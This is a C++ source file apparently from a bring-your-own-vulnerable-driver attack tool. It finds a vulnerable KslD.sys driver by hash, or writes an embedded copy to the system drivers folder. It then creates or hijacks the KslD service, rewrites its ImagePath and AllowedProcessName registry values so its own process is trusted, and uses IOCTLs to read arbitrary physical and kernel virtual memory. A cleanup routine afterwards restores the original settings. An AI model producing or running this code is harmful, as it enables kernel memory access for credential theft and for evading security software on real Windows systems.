#include "driver.h"
#include "driver_payload.h"
#include <filesystem>
#include <bcrypt.h>
#include <fstream>
#include <cwctype>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "bcrypt.lib")

static constexpr wchar_t SERVICE_NAME[] = L"KslD";
static constexpr char VKSLD_SHA256[] =
    "bd17231833aa369b3b2b6963899bf05dbefd673db270aec15446f2fab4a17b5a";

// ================================================================
// Raw IOCTL
// ================================================================
std::pair<bool, Bytes> ioctl_raw(HANDLE h, const void* in_buf, DWORD in_size, DWORD out_size) {
    Bytes out(out_size, 0);
    DWORD bytes_ret = 0;
    BOOL ok = DeviceIoControl(h, KSLD_IOCTL,
        const_cast<void*>(in_buf), in_size,
        out.data(), out_size, &bytes_ret, nullptr);
    if (ok && bytes_ret > 0) {
        out.resize(bytes_ret);
        return { true, std::move(out) };
    }
    return { false, {} };
}

std::pair<bool, Bytes> subcmd2(HANDLE h) {
    IoSubCmd2 cmd{ .sub_cmd = 2, .reserved = 0 };
    return ioctl_raw(h, &cmd, sizeof(cmd), 512);
}

Bytes phys_read(HANDLE h, uint64_t addr, uint64_t size) {
    IoReadInput req{ .sub_cmd = 12, .reserved = 0, .address = addr,
                     .size = size, .mode = 1, .padding = 0 };
    DWORD out_sz = static_cast<DWORD>(std::max<uint64_t>(size + 256, 4096));
    auto [ok, data] = ioctl_raw(h, &req, sizeof(req), out_sz);
    return (data.size() >= size) ? data : Bytes{};
}

static Bytes virt_read_single(HANDLE h, uint64_t addr, uint64_t size) {
    IoReadInput req{ .sub_cmd = 12, .reserved = 0, .address = addr,
                     .size = size, .mode = 2, .padding = 0 };
    DWORD out_sz = static_cast<DWORD>(std::max<uint64_t>(size + 256, 4096));
    auto [ok, data] = ioctl_raw(h, &req, sizeof(req), out_sz);
    return (data.size() >= size) ? data : Bytes{};
}

Bytes virt_read(HANDLE h, uint64_t addr, uint64_t size) {
    auto data = virt_read_single(h, addr, size);
    if (!data.empty()) return data;
    Bytes result;
    result.reserve(static_cast<size_t>(size));
    for (uint64_t off = 0; off < size; ) {
        uint64_t chunk = std::min<uint64_t>(0x400, size - off);
        auto part = virt_read_single(h, addr + off, chunk);
        if (part.empty()) return {};
        result.insert(result.end(), part.begin(), part.begin() + chunk);
        off += chunk;
    }
    return result;
}

// ================================================================
// Path helpers
// ================================================================
static std::wstring get_drivers_dir() {
    wchar_t sys[MAX_PATH]{};
    GetSystemWindowsDirectoryW(sys, MAX_PATH);
    return std::wstring(sys) + L"\\System32\\drivers\\";
}

static std::wstring get_nt_volume_path(const std::wstring& win32_path) {
    wchar_t vol_name[MAX_PATH]{};
    if (QueryDosDeviceW(win32_path.substr(0, 2).c_str(), vol_name, MAX_PATH))
        return std::wstring(vol_name) + win32_path.substr(2);
    return L"\\Device\\HarddiskVolume3" + win32_path.substr(2);
}

// ================================================================
// SHA256 of a file
// ================================================================
static std::string sha256_file(const std::wstring& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) return {};

    BCRYPT_ALG_HANDLE alg = nullptr;
    BCRYPT_HASH_HANDLE hash = nullptr;
    if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, nullptr, 0)))
        return {};
    if (!BCRYPT_SUCCESS(BCryptCreateHash(alg, &hash, nullptr, 0, nullptr, 0, 0))) {
        BCryptCloseAlgorithmProvider(alg, 0); return {};
    }

    uint8_t buf[8192];
    while (f.read(reinterpret_cast<char*>(buf), sizeof(buf)) || f.gcount() > 0) {
        BCryptHashData(hash, buf, static_cast<ULONG>(f.gcount()), 0);
        if (f.eof()) break;
    }

    uint8_t digest[32]{};
    BCryptFinishHash(hash, digest, 32, 0);
    BCryptDestroyHash(hash);
    BCryptCloseAlgorithmProvider(alg, 0);

    std::string hex;
    hex.reserve(64);
    for (auto b : digest) hex += std::format("{:02x}", b);
    return hex;
}

// ================================================================
// Driver check: returns path to usable driver, or empty
// ================================================================
static std::wstring find_vulnerable_driver() {
    auto dir = get_drivers_dir();

    // Priority 1: Original KslD.sys (if Defender installed the vulnerable version)
    auto ksld_path = dir + L"KslD.sys";
    if (std::filesystem::exists(ksld_path) &&
        std::filesystem::file_size(ksld_path) == VKSLD_SIZE) {
        auto hash = sha256_file(ksld_path);
        if (hash == VKSLD_SHA256) {
            std::cout << "  Found vulnerable KslD.sys (SHA256 match)\n";
            return ksld_path;
        }
    }

    // Priority 2: Pre-existing vKslD.sys
    auto vksld_path = dir + L"vKslD.sys";
    if (std::filesystem::exists(vksld_path) &&
        std::filesystem::file_size(vksld_path) == VKSLD_SIZE) {
        auto hash = sha256_file(vksld_path);
        if (hash == VKSLD_SHA256) {
            std::cout << "  Found existing vKslD.sys (SHA256 match)\n";
            return vksld_path;
        }
    }

    return {};
}

static std::wstring deploy_embedded_driver() {
    auto path = get_drivers_dir() + L"vKslD.sys";
    std::cout << "  Deploying embedded driver to vKslD.sys...\n";

    HANDLE hf = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hf == INVALID_HANDLE_VALUE) {
        std::cerr << std::format("[-] CreateFile failed: {}\n", GetLastError());
        return {};
    }

    DWORD written = 0;
    BOOL ok = WriteFile(hf, VKSLD_DATA, static_cast<DWORD>(VKSLD_SIZE), &written, nullptr);
    CloseHandle(hf);

    if (!ok || written != VKSLD_SIZE) {
        DeleteFileW(path.c_str());
        return {};
    }

    auto hash = sha256_file(path);
    if (hash != VKSLD_SHA256) {
        std::cerr << "[-] Deployed driver hash mismatch\n";
        DeleteFileW(path.c_str());
        return {};
    }

    std::cout << "  Driver deployed and verified\n";
    return path;
}

// ================================================================
// Derive the relative ImagePath for SCM from a full path
// e.g. C:\Windows\System32\drivers\vKslD.sys -> system32\drivers\vKslD.sys
// ================================================================
static std::wstring to_relative_image_path(const std::wstring& full_path) {
    // Find "System32" in the path (case insensitive)
    auto lower = full_path;
    for (auto& c : lower) c = static_cast<wchar_t>(std::towlower(c));
    auto pos = lower.find(L"system32");
    if (pos != std::wstring::npos)
        return full_path.substr(pos);
    // Fallback: just use full path
    return full_path;
}

// ================================================================
// SCM service management
// ================================================================
DriverState setup_ksld() {
    DriverState state;

    // Step 1: Find or deploy driver
    auto driver_path = find_vulnerable_driver();
    if (driver_path.empty()) {
        driver_path = deploy_embedded_driver();
        if (driver_path.empty())
            throw std::runtime_error("Vulnerable driver not available");
        state.driver_was_deployed = true;
    }

    std::wstring image_path = to_relative_image_path(driver_path);

    // Step 2: Open SCM
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm)
        throw std::runtime_error(std::format("OpenSCManager failed: {}", GetLastError()));

    // Step 3: Open or create service
    SC_HANDLE svc = OpenServiceW(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!svc) {
        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
            svc = CreateServiceW(scm, SERVICE_NAME, SERVICE_NAME,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL, image_path.c_str(),
                nullptr, nullptr, nullptr, nullptr, nullptr);
            if (!svc) {
                CloseServiceHandle(scm);
                throw std::runtime_error(std::format("CreateService failed: {}", GetLastError()));
            }
            state.service_was_created = true;
            if (state.service_was_created) {
                std::cout << "  Created KslD service\n";

                HKEY hk = nullptr;

                // Fix ErrorControl (CreateServiceW sets 1, driver expects 0)
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\CurrentControlSet\\Services\\KslD",
                    0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {

                    DWORD err_ctrl = 0;
                    RegSetValueExW(hk, L"ErrorControl", 0, REG_DWORD,
                        reinterpret_cast<const BYTE*>(&err_ctrl), sizeof(DWORD));

                    const wchar_t version[] = L"1.1.24110.64078";
                    RegSetValueExW(hk, L"Version", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(version), sizeof(version));

                    const wchar_t dev_name[] = L"KslD";
                    RegSetValueExW(hk, L"DeviceName", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(dev_name), sizeof(dev_name));

                    const wchar_t tdt[] = L"TDT";
                    RegSetValueExW(hk, L"DeviceNameTdt", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(tdt), sizeof(tdt));

                    const wchar_t silo[] = L"stable";
                    RegSetValueExW(hk, L"Silo", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(silo), sizeof(silo));

                    RegCloseKey(hk);
                }

                // Parameters: WppRecorder trace GUID
                if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\CurrentControlSet\\Services\\KslD\\Parameters",
                    0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
                    const wchar_t guid[] = L"{70306dd4-26f5-4e78-af1e-caacf226f683}";
                    RegSetValueExW(hk, L"WppRecorder_TraceGuid", 0, REG_SZ,
                        reinterpret_cast<const BYTE*>(guid), sizeof(guid));
                    RegCloseKey(hk);
                }

                // Parameters\Wdf: KMDF loader version
                if (RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                    L"SYSTEM\\CurrentControlSet\\Services\\KslD\\Parameters\\Wdf",
                    0, nullptr, 0, KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
                    DWORD major = 1, minor = 15;
                    RegSetValueExW(hk, L"WdfMajorVersion", 0, REG_DWORD,
                        reinterpret_cast<const BYTE*>(&major), sizeof(DWORD));
                    RegSetValueExW(hk, L"WdfMinorVersion", 0, REG_DWORD,
                        reinterpret_cast<const BYTE*>(&minor), sizeof(DWORD));
                    RegCloseKey(hk);
                }

                std::cout << "  Configured KMDF and driver parameters\n";
            }


        } else {
            CloseServiceHandle(scm);
            throw std::runtime_error(std::format("OpenService failed: {}", GetLastError()));
        }
    } else {
        // Save original config
        DWORD needed = 0;
        QueryServiceConfigW(svc, nullptr, 0, &needed);
        std::vector<uint8_t> buf(needed);
        auto* cfg = reinterpret_cast<QUERY_SERVICE_CONFIGW*>(buf.data());
        if (QueryServiceConfigW(svc, cfg, needed, &needed) && cfg->lpBinaryPathName)
            state.orig_image_path = cfg->lpBinaryPathName;

        // Stop if running
        SERVICE_STATUS ss{};
        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
        Sleep(2000);

        // Change ImagePath to our driver
        ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
            image_path.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
    }

    // Step 4: AllowedProcessName (treiberspezifisch, nur Registry)
    {
        HKEY hk = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\KslD",
                          0, KEY_ALL_ACCESS, &hk) == ERROR_SUCCESS) {
            // Save original
            wchar_t orig_buf[1024]{};
            DWORD orig_sz = sizeof(orig_buf);
            if (RegQueryValueExW(hk, L"AllowedProcessName", nullptr, nullptr,
                reinterpret_cast<LPBYTE>(orig_buf), &orig_sz) == ERROR_SUCCESS)
                state.orig_allowed = orig_buf;

            // Set to our exe
            wchar_t exe_path[MAX_PATH]{};
            GetModuleFileNameW(nullptr, exe_path, MAX_PATH);
            std::wstring allowed = get_nt_volume_path(exe_path);
            RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
                reinterpret_cast<const BYTE*>(allowed.c_str()),
                static_cast<DWORD>((allowed.size() + 1) * sizeof(wchar_t)));
            RegCloseKey(hk);
        }
    }

    // Step 5: Start service
    if (!StartServiceW(svc, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(svc); CloseServiceHandle(scm);
            throw std::runtime_error(std::format("StartService failed: {}", err));
        }
    }
    Sleep(2000);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    // Step 6: Open device
    HANDLE h = CreateFileW(L"\\\\.\\KslD", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE)
        throw std::runtime_error(std::format("CreateFile(\\\\.\\KslD) failed: {}", GetLastError()));

    state.handle = KslDHandle(h);
    return state;
}

void cleanup_ksld(DriverState& state) {
    state.handle.close();

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm) return;
    SC_HANDLE svc = OpenServiceW(scm, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!svc) { CloseServiceHandle(scm); return; }

    SERVICE_STATUS ss{};
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    Sleep(1000);

    if (state.service_was_created) {
        DeleteService(svc);
    } else {
        if (!state.orig_image_path.empty())
            ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                state.orig_image_path.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!state.orig_allowed.empty()) {
            HKEY hk = nullptr;
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\KslD",
                              0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
                RegSetValueExW(hk, L"AllowedProcessName", 0, REG_SZ,
                    reinterpret_cast<const BYTE*>(state.orig_allowed.c_str()),
                    static_cast<DWORD>((state.orig_allowed.size() + 1) * sizeof(wchar_t)));
                RegCloseKey(hk);
            }
        }
        StartServiceW(svc, 0, nullptr);
    }

    CloseServiceHandle(svc);
    CloseServiceHandle(scm);

    if (state.driver_was_deployed) {
        Sleep(500);
        auto path = get_drivers_dir() + L"vKslD.sys";
        if (DeleteFileW(path.c_str()))
            std::cout << "  Removed deployed vKslD.sys\n";
    }
}
